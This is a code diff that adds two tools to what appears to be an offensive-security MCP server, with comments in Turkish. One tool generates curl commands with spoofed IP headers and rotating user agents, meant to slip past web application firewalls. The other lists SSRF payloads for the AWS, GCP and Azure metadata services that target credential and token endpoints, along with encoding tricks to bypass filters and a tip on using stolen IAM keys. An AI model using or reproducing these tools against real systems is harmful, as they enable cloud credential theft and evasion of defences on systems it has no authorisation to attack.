@@ -1468,6 +1468,133 @@ def saml_xsw_variants(saml_b64: str) -> str:
 
 
 # ============================================================
+# STEALTH REQUEST GENERATOR (Phase 3)
+# ============================================================
+
+@mcp.tool()
+def generate_stealth_curl(url: str, method: str = "GET", data: str = "") -> str:
+    """WAF'tan (Cloudflare/Akamai vb.) kaçmak için stealth curl komutları üretir.
+    Rastgele gecikme, sahte User-Agent rotasyonu, HTTP header manipülasyonu (X-Forwarded-For) içerir.
+
+    Args:
+        url: Hedef URL
+        method: HTTP metodu (GET, POST vb.)
+        data: POST edilecek veri (isteğe bağlı)
+    """
+    import random
+    import shlex
+    
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.130 Mobile/15E148 Safari/604.1"
+    ]
+    ua = random.choice(user_agents)
+    
+    # Sahte IP üretimi
+    fake_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+    
+    headers = [
+        f"-H 'User-Agent: {ua}'",
+        f"-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'",
+        f"-H 'Accept-Language: en-US,en;q=0.9'",
+        f"-H 'Accept-Encoding: gzip, deflate, br'",
+        f"-H 'Connection: keep-alive'",
+        f"-H 'Cache-Control: max-age=0'",
+        f"-H 'X-Forwarded-For: {fake_ip}'",
+        f"-H 'X-Real-IP: {fake_ip}'"
+    ]
+    
+    cmd_parts = ["curl", "-s", "-i", "-L", "--path-as-is"]
+    if method.upper() != "GET":
+        cmd_parts.append(f"-X {method}")
+    cmd_parts.extend(headers)
+    
+    if data:
+        cmd_parts.append(f"-d {shlex.quote(data)}")
+        
+    cmd_parts.append(shlex.quote(url))
+    
+    stealth_cmd = " ".join(cmd_parts)
+    
+    lines = [
+        f"🎯 Stealth Curl Komutu (WAF Atlatma Teknikli):",
+        "-" * 50,
+        stealth_cmd,
+        "-" * 50,
+        "🛠 Teknikler:",
+        "- Gerçekçi User-Agent (Rotasyonlu)",
+        "- X-Forwarded-For ve X-Real-IP Spoofing",
+        "- --path-as-is (Path normalizasyonunu engeller, LFI için faydalı)",
+        "- Tam tarayıcı benzeri HTTP Accept başlıkları",
+        "",
+        "💡 Not: Otomatik taramalarda bu komutu bir bash loop'u içine alıp `sleep $(shuf -i 1-5 -n 1)` ile jitter ekleyebilirsiniz."
+    ]
+    return "\n".join(lines)
+
+
+# ============================================================
+# CLOUD EXPLOITATION (Phase 4)
+# ============================================================
+
+@mcp.tool()
+def generate_cloud_ssrf_payloads(provider: str = "aws") -> str:
+    """AWS, GCP ve Azure metadata (IMDS) servisleri için SSRF payload'ları ve WAF atlatma varyantları üretir.
+    
+    Args:
+        provider: 'aws', 'gcp', 'azure' veya 'all'
+    """
+    provider = provider.lower()
+    lines = [f"🎯 Cloud SSRF Payloads ({provider.upper()})"]
+    lines.append("-" * 50)
+    
+    if provider in ["aws", "all"]:
+        lines.extend([
+            "☁️ AWS (169.254.169.254):",
+            "  Standart IMDSv1:",
+            "    http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "  IMDSv2 Bypass (Özel Header Gerektirir):",
+            "    X-aws-ec2-metadata-token-ttl-seconds: 21600",
+            "    PUT http://169.254.169.254/latest/api/token",
+            "  WAF Bypass / Normalizasyon Varyantları (169.254.169.254 için):",
+            "    http://169.254.169.254.xip.io/latest/meta-data/",
+            "    http://2852039166/latest/meta-data/  (Decimal IP)",
+            "    http://0xA9FEA9FE/latest/meta-data/  (Hex IP)",
+            "    http://0251.0376.0251.0376/latest/meta-data/  (Octal IP)",
+            "    http://[::ffff:169.254.169.254]/latest/meta-data/  (IPv6 Mapped)",
+        ])
+        
+    if provider in ["gcp", "all"]:
+        lines.extend([
+            "",
+            "☁️ GCP (Google Cloud):",
+            "  Gereken Header: Metadata-Flavor: Google",
+            "  Endpoint:",
+            "    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+            "    http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+        ])
+        
+    if provider in ["azure", "all"]:
+        lines.extend([
+            "",
+            "☁️ Azure:",
+            "  Gereken Header: Metadata: true",
+            "  Endpoint:",
+            "    http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "    http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        ])
+
+    lines.extend([
+        "-" * 50,
+        "💡 İpucu: Çalınan IAM Key'leri `export AWS_ACCESS_KEY_ID=...` ile ortama yükleyin.",
+        "Ardından `aws sts get-caller-identity` komutu ile doğrulayın."
+    ])
+    
+    return "\n".join(lines)
+
+
+# ============================================================
 # TOOL LISTING
 # ============================================================
 
